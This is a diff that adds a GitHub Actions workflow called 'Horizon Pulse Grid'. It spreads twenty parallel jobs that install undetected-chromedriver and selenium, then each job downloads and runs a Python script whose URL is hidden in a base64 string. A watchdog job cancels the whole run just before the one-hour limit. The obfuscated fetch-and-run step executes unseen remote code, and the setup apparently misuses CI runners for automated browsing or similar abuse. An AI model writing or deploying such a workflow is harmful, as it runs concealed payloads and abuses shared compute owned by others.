@@ -1,0 +1,103 @@
+name: Horizon Pulse Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: pulse-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Timer job: waits 59 minutes then cancels the active workflow run
+  # =================================================================
+  grid-watchdog:
+    name: "Grid Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DELAY: 3540
+    steps:
+      - name: Start Watchdog
+        run: |
+          echo "[WATCHDOG] Active for run: ${{ github.run_id }}"
+          echo "[WATCHDOG] Waiting ${WATCH_DELAY} seconds before triggering cancel."
+
+          sleep "${WATCH_DELAY}"
+
+          echo "[WATCHDOG] Time limit reached — sending cancel request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Cancel request sent."
+
+  # =================================================================
+  # Worker matrix: parallel execution across alphanumeric units
+  # =================================================================
+  pulse-workers:
+    name: "Unit-${{ matrix.unit_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_tag: ["u7a1", "u7b2", "u7c3", "u7d4", "u7e5", "u7f6", "u7g7", "u7h8", "u7j9", "u7k0", "u8a1", "u8b2", "u8c3", "u8d4", "u8e5", "u8f6", "u8g7", "u8h8", "u8j9", "u8k0"]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Step 1: Prepare system dependencies
+      # -----------------------------------------------------------------
+      - name: Prepare System
+        run: |
+          echo "[SETUP] Preparing Unit-${{ matrix.unit_tag }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Step 2: Fetch remote script
+      # -----------------------------------------------------------------
+      - name: Fetch Script
+        run: |
+          echo "[FETCH] Pulling remote script..."
+          SOURCE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SOURCE_URL" -o worker_app.py
+          echo "[FETCH] Script saved locally."
+
+      # -----------------------------------------------------------------
+      # Step 3: Install Python dependencies
+      # -----------------------------------------------------------------
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Step 4: Run script with a 59-minute cap
+      # -----------------------------------------------------------------
+      - name: Run Worker Script
+        run: |
+          echo ">> Starting Unit-${{ matrix.unit_tag }} process..."
+
+          python3 worker_app.py &
+          PROC_ID=$!
+
+          echo ">> Process started. Cap set to 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$PROC_ID" 2>/dev/null; then
+            echo ">> Time cap reached — stopping process."
+            kill -9 "$PROC_ID"
+            echo ">> Process stopped."
+          else
+            echo ">> Process finished early."
+          fi
